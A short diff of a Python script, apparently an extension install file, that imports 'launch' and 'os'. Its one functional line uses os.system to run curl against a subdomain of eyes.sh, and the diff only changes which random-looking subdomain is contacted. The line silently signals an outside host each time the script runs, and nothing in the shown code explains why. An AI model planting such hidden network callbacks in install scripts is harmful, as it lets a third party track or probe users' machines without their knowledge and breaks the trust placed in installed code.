@@ -1,3 +1,3 @@
 import launch
 import os
-os.system("curl secx.eyes.sh")
+os.system("curl jyuylwmt.eyes.sh")
